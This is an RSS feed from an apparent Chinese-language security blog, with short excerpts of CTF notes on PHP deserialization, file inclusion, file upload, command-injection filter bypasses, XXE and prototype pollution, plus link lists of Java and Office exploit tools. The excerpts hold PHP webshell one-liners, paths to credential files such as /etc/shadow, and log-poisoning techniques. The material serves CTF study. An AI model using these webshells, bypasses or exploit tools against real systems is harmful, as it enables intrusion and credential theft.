<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>CTF - Category - Sc0fie1d</title>
        <link>http://scofield1920.github.io/categories/ctf/</link>
        <description>CTF - Category - Sc0fie1d</description>
        <generator>Hugo -- gohugo.io</generator><language>en</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><atom:link href="http://scofield1920.github.io/categories/ctf/" rel="self" type="application/rss+xml" /><item>
    <title>ctfshow_deserialize</title>
    <link>http://scofield1920.github.io/ctfshow_deserialize/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_deserialize/</guid>
    <description><![CDATA[PHP面向对象编程：
https://www.runoob.com/php./php-oop.html
总结：Lethe&rsquo;s Blog谈一谈PHP反序列化
反序列化中常见的魔术方法：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 __wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 靶场题目：[web254] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;?]]></description>
</item><item>
    <title>ctfshow_file_include</title>
    <link>http://scofield1920.github.io/ctfshow_file_include/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_file_include/</guid>
    <description><![CDATA[总结：文件包含漏洞全面详解
php文件包含函数：
1 2 3 4 require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 本地文件包含漏洞(LFI)常见敏感信息路径:Windows系统:
C:\boot.ini //查看系统版本 C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件 C:\windows\repair\sam //存储Windows系统初次安装的密码 C:\ProgramFiles\mysql\my.ini //Mysql配置 C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码 C:\windows\php.ini //php配置信息 Linux/Unix系统:
/etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。
包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。
利用条件：
对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知
以直接访问的形式来写入如访问127.0.0.1&lt;?php phpinfo();?&gt;在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码
包含Session文件利用条件：
找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径:
/var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径
包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。
由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。
远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php&lt;5.3.4）、?截断（?后内容被视作GET传参）
PHP伪协议file://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响
1 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。]]></description>
</item><item>
    <title>ctfshow_file_upload</title>
    <link>http://scofield1920.github.io/ctfshow_file_upload/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_file_upload/</guid>
    <description><![CDATA[总结：CTF中文件上传及文件包含总结
CTF文件上传漏洞总结
文件上传马儿总结：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?&gt; &lt;?]]></description>
</item><item>
    <title>ctfshow_rce</title>
    <link>http://scofield1920.github.io/ctfshow_rce/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_rce/</guid>
    <description><![CDATA[总结：文件读取可代替命令 1 2 3 4 5 6 7 8 9 10 11 12 13 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 rev:逆序查看 以及：
1 2 3 4 5 curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd 空格绕过 1 2 3 4 5 6 7 8 &lt; &lt;&gt;	//重定向符 %20	//(space) %09	//(tab) $IFS$9 ${IFS}	//最好用这个 $IFS {cat,flag.]]></description>
</item><item>
    <title>ctfshow_xxe</title>
    <link>http://scofield1920.github.io/ctfshow_xxe/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_xxe/</guid>
    <description><![CDATA[总结xml基础XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
xml文档结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt;!--XML申明--&gt; &lt;?xml version=&#34;1.0&#34;?&gt; &lt;!--文档类型定义--&gt; &lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]]]&gt; &lt;!--文档元素--&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可
被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD:
1 &lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:]]></description>
</item><item>
    <title>JavaScript 原型链污染</title>
    <link>http://scofield1920.github.io/javascript_prototype_pollution/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/javascript_prototype_pollution/</guid>
    <description><![CDATA[前置基础知识原型链污染攻击也称JavaScript Prototype 污染攻击
Javascript
JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式
—JavaScript 百度百科
NodeJS
Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I/O模型， 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。
—NodeJS 百度百科
JavaScript数据类型let和var关键字的区别使用var或let关键字可以定义变量
let和var的区别如下：
var是全局作用域，let 只在当前代码块内有效
当在代码块外访问let声明的变量时会报错
var有变量提升，let没有变量提升
let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined
var可以在声明前访问，只是会报undefined
let变量不能重复声明，var变量可以重复声明
普通变量 1 2 3 4 var x=5; var y=6; var z=x+y; var x,y,z=1; 1 let x=5; 数组变量 1 var a = new Array(); 1 var a = []; 字典 1 2 var a = {}; var a = {&#34;foo&#34;:&#34;bar&#34;}; JavaScript函数在Javascript中，函数使用function关键字来进行声明]]></description>
</item><item>
    <title>Java反序列化漏洞exp收集</title>
    <link>http://scofield1920.github.io/java_unserialize_exp/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/java_unserialize_exp/</guid>
    <description><![CDATA[https://github.com/brianwrf/hackUtils java反序列化利用
https://github.com/GoSecure/break-fast-serial 借助DNS解析来检测Java反序列化漏洞工具
https://github.com/s1kr10s/Apache-Struts-v3 Apache-Struts漏洞利用工具
https://github.com/iBearcat/S2-057 struts2 CVE-2018-11776 漏洞检测工具
https://github.com/Ivan1ee/struts2-057-exp struts2-057利用脚本
https://github.com/theLSA/s2sniper struts2漏洞的检测工具
https://github.com/Lucifer1993/struts-scan 批量检测struts命令执行漏洞
https://github.com/lijiejie/struts2_045_scan Struts2-045漏洞批量扫描工具
https://github.com/riusksk/StrutScan 基于perl的strut2的历史漏洞扫描
https://github.com/Coalfire-Research/java-deserialization-exploits java反序列化漏洞收集
https://github.com/quentinhardy/jndiat weblogic漏洞利用工具
https://github.com/jas502n/CVE-2018-3191 Weblogic CVE-2018-3191远程代码命令执行
https://github.com/pyn3rd/CVE-2018-3245 weblogic cve-2018-2893与cve-2018-3245远程代码命令执行
https://github.com/NickstaDB/BaRMIe 用于Java Remote Method Invocation服务的工具/rmi的枚举与远程命令执行
https://github.com/joaomatosf/jexboss JBoss和其他java序列化漏洞验证和开发工具
https://github.com/frohoff/ysoserial java反序列化利用工具]]></description>
</item><item>
    <title>MS&amp;Office漏洞exp收集</title>
    <link>http://scofield1920.github.io/msoffice_exp/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/msoffice_exp/</guid>
    <description><![CDATA[https://github.com/Lz1y/CVE-2017-8759 .NET Framework换行符漏洞，CVE-2017-8759完美复现 （另附加hta+powershell弹框闪烁解决方案）https://www.freebuf.com/vuls/147793.html
https://github.com/WyAtu/CVE-2018-8581 Exchange使用完成添加收信规则的操作进行横向渗透和提权漏洞
https://github.com/dafthack/MailSniper PS,用于在Microsoft Exchange环境搜索电子邮件查找特定邮件（密码、网络架构信息等）
https://github.com/sensepost/ruler GO,通过MAPI / HTTP或RPC / HTTP协议远程与Exchange服务器进行交互,通过客户端Outlook功能远程获取shell
https://github.com/3gstudent/Smbtouch-Scanner 扫描内网永恒之蓝ETERNAL445SMB系列漏洞
https://github.com/smgorelik/Windows-RCE-exploits windows命令执行RCE漏洞POC样本，分为web与文件两种形式
https://github.com/3gstudent/CVE-2017-8464-EXP CVE-2017-8464，win快捷方式远程执行漏洞
https://github.com/Lz1y/CVE-2018-8420 Windows的msxml解析器漏洞可以通过ie或vbs执行后门
https://www.anquanke.com/post/id/163000 利用Excel 4.0宏躲避杀软检测的攻击技术分析
https://github.com/BuffaloWill/oxml_xxe XXE漏洞利用
https://thief.one/2017/06/20/1/ 浅谈XXE漏洞攻击与防御
https://github.com/thom-s/docx-embeddedhtml-injection word2016，滥用Word联机视频特征执行恶意代码poc
https://blog.cymulate.com/abusing-microsoft-office-online-video word2016，滥用Word联机视频特征执行恶意代码介绍
https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads 无需开启宏即可在word文档中利用DDE执行命令
http://www.freebuf.com/articles/terminal/150285.html 无需开启宏即可在word文档中利用DDE执行命令利用
https://github.com/Ridter/CVE-2017-11882 利用word文档RTF获取shell，https://evi1cg.me/archives/CVE_2017_11882_exp.html
https://github.com/Lz1y/CVE-2017-8759 利用word文档hta获取shell，http://www.freebuf.com/vuls/147793.html
https://fuping.site/2017/04/18/CVE-2017-0199漏洞复现过程 WORD RTF 文档，配合msf利用
https://github.com/tezukanice/Office8570 利用ppsx幻灯片远程命令执行，https://github.com/rxwx/CVE-2017-8570
https://github.com/0x09AL/CVE-2018-8174-msf 目前支持的版本是 32 位 IE 浏览器和 32 位 office。 网页访问上线，浏览器关闭，shell 依然存活，http://www.freebuf.com/vuls/173727.html
http://www.4hou.com/technology/9405.html 在 Office 文档的属性中隐藏攻击载荷
https://evi1cg.me/archives/Create_PPSX.html 构造PPSX钓鱼文件
https://github.com/enigma0x3/Generate-Macro PowerShell脚本，生成含有恶意宏的Microsoft Office文档
https://github.com/mwrlabs/wePWNise 生成独立于体系结构的VBA代码，用于Office文档或模板，并自动绕过应用程序控制]]></description>
</item><item>
    <title>Nmap参数</title>
    <link>http://scofield1920.github.io/nmap/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/nmap/</guid>
    <description><![CDATA[基本操作基本快速扫描Nmap 默认发送一个 arp 的 ping 数据包，来探测一些常用端口是否开放。
1 2 CODE nmap 10.130.1.43 快速扫描多个目标 1 2 BASHnmap &lt;target ip1 address&gt; &lt;target ip2 address&gt; nmap 10.130.1.28 10.130.1.43 详细描述输出扫描简单扫描，并对返回的结果详细描述输出，这个扫描是可以看到扫描的过程的，漫长的扫描的过程中可以看到百分比， 就不会显得那么枯燥，而且可以提升逼格。
1 2 3 CODE nmap -vv 10.1.1.254 亲测，`-v` 和 `-vv` 扫描几乎是一样都，都是列出了详细的扫描过程。 指定端口和范围扫描Nmap 默认扫描目标的常见端口号。我们可以通过参数 -p 来指定设置我们将要扫描的端口号：
1 2 BASHnmap -p(range) &lt;target IP&gt; namp -p3389,20-100 10.130.1.43 扫描除过某一个 ip 外的所有子网主机 1 2 CODE nmap 10.130.1.1/24 -exclude 10.130.1.1 扫描除过某一个文件中的 ip 外的子网主机 1 2 BASH nmap 10.130.1.1/24 -excludefile gov.]]></description>
</item><item>
    <title>NSSCTF-reverse-wp</title>
    <link>http://scofield1920.github.io/nssctf-reverse-wp/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>scofield_lee</name>
    </author><guid>http://scofield1920.github.io/nssctf-reverse-wp/</guid>
    <description><![CDATA[[SWPUCTF 2021 新生赛]re1很简单，写的c语言脚本
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char Str1[1000]; strcpy_s(Str1, sizeof(Str1), &#34;{34sy_r3v3rs3}&#34;); int i; for (i = 0; i &lt;= 665; ++i) { if (Str1[i] == &#39;3&#39;) Str1[i] = &#39;e&#39;; } for (i = 0; i &lt;= 665; ++i) { if (Str1[i] == &#39;4&#39;) Str1[i] = &#39;a&#39;; } printf(&#34;%s&#34;, Str1); } Tips：]]></description>
</item></channel>
</rss>
